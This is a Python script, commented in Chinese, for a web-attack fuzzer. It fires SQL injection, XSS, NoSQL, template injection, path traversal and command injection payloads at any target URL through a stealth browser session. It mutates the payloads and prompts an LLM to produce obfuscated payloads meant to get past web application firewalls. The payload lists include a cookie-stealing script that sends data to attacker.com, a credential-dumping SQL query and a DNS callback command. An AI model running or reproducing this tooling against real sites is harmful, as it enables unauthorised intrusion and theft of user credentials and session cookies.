#!/usr/bin/env python3
"""
AI Adaptive Fuzzer — AI 自适应模糊测试引擎

利用 LLM 动态生成 payload，根据目标响应自我迭代优化，
绕过传统 WAF 和静态规则检测。

Usage:
  python ai_fuzzer.py https://target.com --param q --goal sqli
  python ai_fuzzer.py https://target.com --auto-discover --goal xss
  python ai_fuzzer.py https://target.com --param id --goal nosql
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import random
import re
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse

_SCRIPT_DIR = Path(__file__).parent
sys.path.insert(0, str(_SCRIPT_DIR))

from cdp_launch import connect_playwright_cdp_async


@dataclass
class FuzzResult:
    """单个 fuzz 测试结果。"""
    url: str
    param: str
    payload: str
    vuln_type: str
    confidence: int = 0
    confirmed: bool = False
    response_signature: str = ""
    response_time_ms: float = 0.0
    status_code: int = 0
    error_keywords: list[str] = field(default_factory=list)
    iteration: int = 0


class PayloadGenerator:
    """
    多策略 payload 生成器。

    支持:
    - 规则基础生成（经典 payload 变体）
    - AI 动态生成（LLM 根据上下文生成）
    - 响应驱动变异（根据前序响应调整）
    """

    # 经典 payload 模板库
    SQLI_TEMPLATES = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND SLEEP(5)--",
        "1' AND pg_sleep(5)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "' OR '1'='1' /*",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "' OR 1=1 LIMIT 1--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' UNION SELECT username,password FROM users--",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
        "1' AND 1=CONVERT(int, (SELECT @@version))--",
    ]

    XSS_TEMPLATES = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    ]

    NOSQL_TEMPLATES = [
        "{'$gt': ''}",
        "{'$ne': null}",
        "{'$regex': '.*'}",
        "{'$where': 'this.password.length > 0'}",
        "[$ne]=1",
        "[$gt]=",
        "[$regex]=.*",
        "{'$or': [{'a': 'a'}, {'b': 'b'}]}",
    ]

    SSTI_TEMPLATES = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__}}",
    ]

    PATH_TRAVERSAL_TEMPLATES = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "....\\....\\....\\windows\\win.ini",
    ]

    COMMAND_INJECTION_TEMPLATES = [
        "; id",
        "| id",
        "` id `",
        "$(id)",
        "; cat /etc/passwd",
        "&& whoami",
        "|| whoami",
        "; nslookup attacker.com",
        "| powershell -c whoami",
    ]

    def __init__(self, goal: str = "sqli"):
        self.goal = goal
        self.history: list[FuzzResult] = []
        self.success_patterns: list[str] = []

    def get_templates(self) -> list[str]:
        mapping = {
            "sqli": self.SQLI_TEMPLATES,
            "xss": self.XSS_TEMPLATES,
            "nosql": self.NOSQL_TEMPLATES,
            "ssti": self.SSTI_TEMPLATES,
            "path_traversal": self.PATH_TRAVERSAL_TEMPLATES,
            "cmdi": self.COMMAND_INJECTION_TEMPLATES,
            "graphql_injection": self.SQLI_TEMPLATES,
        }
        return mapping.get(self.goal, self.SQLI_TEMPLATES)

    def generate_base_payloads(self, count: int = 20) -> list[str]:
        """生成基础 payload 集。"""
        templates = self.get_templates()
        payloads = []
        
        for t in templates[:count]:
            payloads.append(t)
            payloads.extend(self._mutate(t))
        
        return payloads[:count]

    def _mutate(self, payload: str) -> list[str]:
        """对 payload 进行变异，生成绕过变体。"""
        variants = []
        variants.append(payload.replace(" ", "%20").replace("'", "%27"))
        variants.append(payload.lower())
        variants.append(payload.upper())
        variants.append(payload.replace("<script>", "<scr<script>ipt>"))
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace("'", "\\u0027"))
        return variants[:5]

    def generate_ai_payload(self, context: dict) -> str:
        """根据上下文生成 AI payload。"""
        api_key = os.environ.get("OPENAI_API_KEY")
        
        if api_key:
            return self._call_llm(context)
        else:
            return self._heuristic_generate(context)

    def _call_llm(self, context: dict, max_retries: int = 2) -> str:
        """调用 LLM API 生成 payload（带重试）。"""
        try:
            import openai
            client = openai.OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))
            
            prompt = f"""
You are an expert penetration tester. Generate a {self.goal} payload for the following context:

Target: {context.get('url', 'unknown')}
Parameter: {context.get('param', 'unknown')}
Technology: {context.get('tech', 'unknown')}
Previous errors: {context.get('errors', [])}

Requirements:
1. The payload should bypass common WAF rules
2. Use encoding/obfuscation where appropriate
3. Return ONLY the payload string, no explanation
"""
            last_err = None
            for attempt in range(max_retries + 1):
                try:
                    resp = client.chat.completions.create(
                        model="gpt-4o-mini",
                        messages=[{"role": "user", "content": prompt}],
                        temperature=0.9,
                        max_tokens=200,
                    )
                    return resp.choices[0].message.content.strip()
                except Exception as e:
                    last_err = e
                    if attempt < max_retries:
                        wait = 2 ** attempt  # 1s, 2s
                        print(f"[!] LLM call attempt {attempt+1} failed: {e}, retrying in {wait}s...")
                        time.sleep(wait)
            # All retries exhausted
            print(f"[!] LLM call failed after {max_retries+1} attempts: {last_err}, falling back to heuristic")
            return self._heuristic_generate(context)
        except ImportError:
            return self._heuristic_generate(context)
        except Exception as e:
            print(f"[!] LLM call failed: {e}, falling back to heuristic")
            return self._heuristic_generate(context)

    def _heuristic_generate(self, context: dict) -> str:
        """启发式生成 payload（无需 API key）。"""
        errors = context.get("errors", [])
        
        if "mysql" in str(errors).lower() or "mysqli" in str(errors).lower():
            return random.choice([
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--",
                "1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
            ])
        elif "postgresql" in str(errors).lower() or "pg_" in str(errors).lower():
            return "1' AND 1=cast((SELECT version()) as int)--"
        elif "sqlite" in str(errors).lower():
            return "1' UNION SELECT sqlite_version(),2,3--"
        elif "mssql" in str(errors).lower() or "sql server" in str(errors).lower():
            return "1'; WAITFOR DELAY '0:0:5'--"
        
        if self.goal == "xss":
            return random.choice(self.XSS_TEMPLATES)
        elif self.goal == "nosql":
            return random.choice(self.NOSQL_TEMPLATES)
        elif self.goal == "ssti":
            return random.choice(self.SSTI_TEMPLATES)
        
        return random.choice(self.SQLI_TEMPLATES)

    def evolve_payload(self, result: FuzzResult) -> str:
        """根据前序结果进化 payload。"""
        if result.confirmed:
            if self.goal == "sqli":
                return result.payload.replace("1=1", "1=1 UNION SELECT username,password FROM users")
            return result.payload
        
        if "error" in result.response_signature.lower():
            mutated = self._mutate(result.payload)
            return mutated[0] if mutated else result.payload
        
        return self.generate_ai_payload({
            "url": result.url,
            "param": result.param,
            "errors": result.error_keywords,
        })


class AdaptiveFuzzer:
    """AI 自适应模糊测试引擎。"""

    ERROR_SIGNATURES = {
        "sql": ["sql syntax", "mysql_fetch", "pg_query", "sqlite_query", 
                "ora-", "sqlstate", "odbc", "jdbc", "syntax error"],
        "xss": ["<script>", "javascript:", "onerror=", "onload="],
        "ssti": ["jinja2", "template", "render", "undefinederror"],
        "cmdi": ["command not found", "sh:", "bash:", "powershell"],
        "path": ["no such file", "directory listing", "root:x:0:0"],
    }

    def __init__(self, target: str, cdp_port: int = 9222, goal: str = "sqli"):
        self.target = target.rstrip("/")
        self.cdp_port = cdp_port
        self.goal = goal
        self.generator = PayloadGenerator(goal=goal)
        self.results: list[FuzzResult] = []
        self.baseline_status = 200
        self.baseline_length = 0
        self.baseline_time = 0.0

    async def _get_browser_ctx(self):
        """获取 CDP 浏览器上下文。"""
        browser, pw = await connect_playwright_cdp_async(port=self.cdp_port, stealth=True)
        ctx = browser.contexts[0] if browser.contexts else await browser.new_context()
        return ctx, browser, pw

    async def _send_payload(self, ctx, url: str, param: str, payload: str) -> dict:
        """通过 CDP 发送 payload 并收集响应特征。"""
        start = time.time()
        
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            qs[param] = [payload]
            new_qs = urlencode(qs, doseq=True)
            fuzz_url = urlunparse(parsed._replace(query=new_qs))
            
            resp = await ctx.request.get(fuzz_url, timeout=15000)
            
            elapsed = (time.time() - start) * 1000
            text = await resp.text()
            
            return {
                "status": resp.status,
                "text": text,
                "time_ms": elapsed,
                "headers": dict(resp.headers),
                "url": fuzz_url,
            }
        except Exception as e:
            elapsed = (time.time() - start) * 1000
            return {
                "status": 0,
                "text": str(e),
                "time_ms": elapsed,
                "headers": {},
                "url": url,
                "error": str(e),
            }

    def _analyze_response(self, baseline: dict, response: dict, payload: str) -> FuzzResult:
        """分析响应，判断是否存在漏洞。"""
        text = response.get("text", "")
        status = response.get("status", 0)
        time_ms = response.get("time_ms", 0)
        
        confidence = 0
        confirmed = False
        error_keywords = []
        signature = ""
        vuln_type = self.goal
        
        # 检测错误关键词
        text_lower = text.lower()
        for category, keywords in self.ERROR_SIGNATURES.items():
            for kw in keywords:
                if kw in text_lower:
                    error_keywords.append(kw)
                    confidence += 15
                    if category == "sql" and self.goal in ("sqli", "graphql_injection"):
                        confirmed = True
                        vuln_type = "sqli"
                    elif category == "xss" and self.goal == "xss":
                        confirmed = True
                        vuln_type = "xss"
                    elif category == "ssti" and self.goal == "ssti":
                        confirmed = True
                        vuln_type = "ssti"
                    elif category == "cmdi" and self.goal == "cmdi":
                        confirmed = True
                        vuln_type = "cmdi"
                    elif category == "path" and self.goal == "path_traversal":
                        confirmed = True
                        vuln_type = "path_traversal"
        
        # 响应时间检测（时间盲注）
        if time_ms > 4000 and self.goal in ("sqli", "nosql"):
            confidence += 20
            if time_ms > 4800:
                confirmed = True
                signature = f"time_based_blind ({time_ms:.0f}ms)"
        
        # 状态码异常
        if status != baseline.get("status", 200):
            confidence += 10
            if status == 500:
                confidence += 15
        
        # 内容长度差异
        baseline_len = baseline.get("length", 0)
        current_len = len(text)
        if baseline_len > 0 and abs(current_len - baseline_len) > baseline_len * 0.3:
            confidence += 10
            signature += f" length_diff={current_len - baseline_len}"
        
        # 特定模式匹配
        if self.goal == "xss" and payload in text:
            confidence += 25
            confirmed = True
        
        if self.goal == "ssti":
            if "49" in text and "{{7*7}}" in payload:  # 7*7=49
                confidence += 30
                confirmed = True
        
        # 响应签名
        if not signature:
            signature = f"status={status}, time={time_ms:.0f}ms, len={current_len}"
        
        confidence = min(confidence, 100)
        
        return FuzzResult(
            url=response.get("url", ""),
            param="",
            payload=payload,
            vuln_type=vuln_type,
            confidence=confidence,
            confirmed=confirmed,
            response_signature=signature.strip(),
            response_time_ms=time_ms,
            status_code=status,
            error_keywords=error_keywords,
        )

    async def _establish_baseline(self, ctx, url: str, param: str) -> dict:
        """建立基准响应。"""
        normal_payload = "test123"
        resp = await self._send_payload(ctx, url, param, normal_payload)
        
        self.baseline_status = resp.get("status", 200)
        self.baseline_length = len(resp.get("text", ""))
        self.baseline_time = resp.get("time_ms", 0)
        
        return {
            "status": self.baseline_status,
            "length": self.baseline_length,
            "time": self.baseline_time,
        }

    async def discover_params(self) -> list[str]:
        """自动发现 URL 参数。"""
        ctx, browser, pw = await self._get_browser_ctx()
        
        try:
            page = await ctx.new_page()
            await page.goto(self.target, wait_until="networkidle", timeout=30000)
            
            # 从页面表单提取参数
            params = set()
            
            # 提取 input name
            inputs = await page.locator("input[name]").all()
            for inp in inputs:
                name = await inp.get_attribute("name")
                if name:
                    params.add(name)
            
            # 提取 URL 参数
            current_url = page.url
            parsed = urlparse(current_url)
            qs_params = parse_qs(parsed.query)
            params.update(qs_params.keys())
            
            # 提取链接中的参数
            links = await page.locator("a[href]").all()
            for link in links:
                href = await link.get_attribute("href")
                if href and "?" in href:
                    parsed_link = urlparse(href)
                    link_params = parse_qs(parsed_link.query)
                    params.update(link_params.keys())
            
            await page.close()
            return list(params) if params else ["id", "q", "search", "page"]
        finally:
            pass

    async def fuzz_param(self, param: str, url: str = None, max_iterations: int = 30) -> list[FuzzResult]:
        """对单个参数进行模糊测试。"""
        target_url = url or self.target
        
        ctx, browser, pw = await self._get_browser_ctx()
        
        try:
            # 建立基准
            baseline = await self._establish_baseline(ctx, target_url, param)
            print(f"[*] Baseline: status={baseline['status']}, len={baseline['length']}, time={baseline['time']:.0f}ms")
            
            results = []
            
            # Phase 1: 基础模板测试
            base_payloads = self.generator.generate_base_payloads(count=15)
            print(f"[*] Phase 1: Testing {len(base_payloads)} base payloads")
            
            for i, payload in enumerate(base_payloads):
                resp = await self._send_payload(ctx, target_url, param, payload)
                result = self._analyze_response(baseline, resp, payload)
                result.param = param
                result.iteration = i + 1
                results.append(result)
                
                if result.confirmed:
                    print(f"  [!!!] CONFIRMED: {result.vuln_type} @ {param} = {payload[:60]}")
                elif result.confidence > 30:
                    print(f"  [!] Suspicious ({result.confidence}%): {payload[:60]}")
                
                await asyncio.sleep(0.3)  # 限速避免 WAF
            
            # Phase 2: AI 生成/进化
            print(f"[*] Phase 2: AI evolution ({max_iterations - len(base_payloads)} iterations)")
            
            for i in range(len(base_payloads), max_iterations):
                # 选择最佳前序结果作为进化基础
                promising = [r for r in results if r.confidence > 20]
                if promising:
                    base_result = max(promising, key=lambda r: r.confidence)
                    payload = self.generator.evolve_payload(base_result)
                else:
                    payload = self.generator.generate_ai_payload({
                        "url": target_url,
                        "param": param,
                        "tech": "unknown",
                        "errors": [],
                    })
                
                resp = await self._send_payload(ctx, target_url, param, payload)
                result = self._analyze_response(baseline, resp, payload)
                result.param = param
                result.iteration = i + 1
                results.append(result)
                
                if result.confirmed:
                    print(f"  [!!!] CONFIRMED (AI): {result.vuln_type} @ {param} = {payload[:60]}")
                elif result.confidence > 30:
                    print(f"  [!] Suspicious AI ({result.confidence}%): {payload[:60]}")
                
                await asyncio.sleep(0.5)
            
            self.results.extend(results)
            return results
            
        finally:
            pass

    async def fuzz_post_param(self, url: str, param: str, 
                               other_fields: dict = None, max_iterations: int = 20) -> list[FuzzResult]:
        """对 POST 参数进行模糊测试。"""
        ctx, browser, pw = await self._get_browser_ctx()
        
        try:
            baseline_fields = other_fields or {}
            baseline_fields[param] = "test123"
            
            # 建立基准
            start = time.time()
            resp = await ctx.request.post(url, form=baseline_fields, timeout=15000)
            baseline_time = (time.time() - start) * 1000
            baseline_text = await resp.text()
            
            baseline = {
                "status": resp.status,
                "length": len(baseline_text),
                "time": baseline_time,
            }
            
            results = []
            payloads = self.generator.generate_base_payloads(count=max_iterations)
            
            for payload in payloads:
                fields = dict(other_fields or {})
                fields[param] = payload
                
                start = time.time()
                resp = await ctx.request.post(url, form=fields, timeout=15000)
                elapsed = (time.time() - start) * 1000
                text = await resp.text()
                
                response = {
                    "status": resp.status,
                    "text": text,
                    "time_ms": elapsed,
                    "headers": dict(resp.headers),
                    "url": url,
                }
                
                result = self._analyze_response(baseline, response, payload)
                result.param = param
                results.append(result)
                
                if result.confirmed:
                    print(f"  [!!!] POST CONFIRMED: {result.vuln_type} @ {param}")
                
                await asyncio.sleep(0.3)
            
            return results
        finally:
            pass


async def main():
    parser = argparse.ArgumentParser(
        description="AI Adaptive Fuzzer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ai_fuzzer.py https://target.com --param id --goal sqli
  python ai_fuzzer.py https://target.com --auto-discover --goal xss
  python ai_fuzzer.py https://target.com --param search --goal sqli --iterations 50
        """
    )
    parser.add_argument("target", help="目标 URL")
    parser.add_argument("--param", help="要 fuzz 的参数名")
    parser.add_argument("--auto-discover", action="store_true", help="自动发现参数")
    parser.add_argument("--goal", default="sqli", 
                        choices=["sqli", "xss", "nosql", "ssti", "path_traversal", "cmdi", "graphql_injection"],
                        help="漏洞类型目标")
    parser.add_argument("--iterations", type=int, default=30, help="最大迭代次数")
    parser.add_argument("--cdp-port", type=int, default=9222, help="CDP 端口")
    parser.add_argument("--output", help="JSON 结果输出文件")

    args = parser.parse_args()

    fuzzer = AdaptiveFuzzer(
        target=args.target,
        cdp_port=args.cdp_port,
        goal=args.goal,
    )

    params = []
    if args.auto_discover:
        print("[*] Auto-discovering parameters...")
        params = await fuzzer.discover_params()
        print(f"[*] Found params: {params}")
    elif args.param:
        params = [args.param]
    else:
        print("[!] Specify --param or --auto-discover")
        sys.exit(1)

    all_results = []
    for param in params:
        print(f"\n{'='*60}")
        print(f"Fuzzing param: {param}")
        print(f"{'='*60}")
        results = await fuzzer.fuzz_param(param, max_iterations=args.iterations)
        all_results.extend(results)

    confirmed = [r for r in all_results if r.confirmed]
    print(f"\n{'='*60}")
    print(f"Summary: {len(confirmed)} confirmed / {len(all_results)} total")
    print(f"{'='*60}")
    
    for r in confirmed:
        print(f"  [CONFIRMED] {r.vuln_type} @ {r.param}")
        print(f"    Payload: {r.payload[:80]}")
        print(f"    Confidence: {r.confidence}%")

    if args.output:
        output_data = [
            {
                "url": r.url,
                "param": r.param,
                "payload": r.payload,
                "vuln_type": r.vuln_type,
                "confirmed": r.confirmed,
                "confidence": r.confidence,
                "status_code": r.status_code,
                "response_time_ms": r.response_time_ms,
                "signature": r.response_signature,
            }
            for r in all_results
        ]
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(output_data, f, indent=2, ensure_ascii=False)
        print(f"[+] Results saved to {args.output}")


if __name__ == "__main__":
    asyncio.run(main())
